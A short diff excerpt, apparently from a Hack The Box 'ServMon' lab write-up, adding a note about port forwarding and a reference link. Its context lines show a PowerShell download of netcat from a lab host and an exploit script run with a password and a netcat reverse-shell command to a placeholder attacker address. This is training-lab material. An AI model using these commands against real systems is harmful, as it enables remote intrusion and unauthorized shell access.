@@ -119,3 +119,5 @@ nadine@SERVMON C:\Users\Nadine\Desktop>powershell -c "curl http://10.10.14.11/nc
 
 └─# python exploit.py -t 10.10.10.184 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c "nc.exe -e cmd.exe <Attacker_IP> <PORT>"
 
+I need to port forward here.
+Reference: https://blog.luckolen.xyz/posts/HTB/ServMon#privilege-escalation
